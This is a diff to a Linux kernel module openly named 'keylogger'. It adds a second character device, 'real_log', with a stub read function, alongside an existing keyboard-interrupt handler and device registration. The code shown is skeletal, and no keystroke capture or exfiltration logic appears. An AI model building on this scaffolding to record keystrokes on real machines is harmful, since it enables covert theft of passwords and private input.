@@ -17,6 +17,18 @@ static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *of
 	}
 	return 0;
 }
+
+static ssize_t	log_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
+{
+	/*if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
+	{
+		read_done = 1;
+		return (*offset);
+	}*/
+
+	return 0;
+}
+
 /*
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
@@ -33,10 +45,22 @@ static struct file_operations	key_ops = {
 	//.write = key_write
 };
 
+static struct file_operations	log_ops = {
+
+	.owner = THIS_MODULE,
+	.read = log_read,
+};
+
 static struct miscdevice	key_dev = {
 	.minor = MISC_DYNAMIC_MINOR,
         .name = "keylogger",
         .fops = &key_ops
+};
+
+static struct miscdevice	log_dev = {
+	.minor = MISC_DYNAMIC_MINOR,
+        .name = "real_log",
+        .fops = &log_ops
 };
 
 static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
@@ -60,6 +84,8 @@ static int		__init keylogger_init(void)
 
 	if (misc_register(&key_dev))
 		return 1;
+	if (misc_register(&log_dev))
+		return 1;
 	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
 	{
 		printk(KERN_INFO "something went wrong in request_irq\n");
@@ -73,6 +99,7 @@ static void		__exit keylogger_exit(void)
 	free_irq(KBD_IRQ, (void *)kbd_irq_handler);
 	//filp_close(fp, NULL);
 	misc_deregister(&key_dev);
+	misc_deregister(&log_dev);
 }
 
 module_init(keylogger_init);
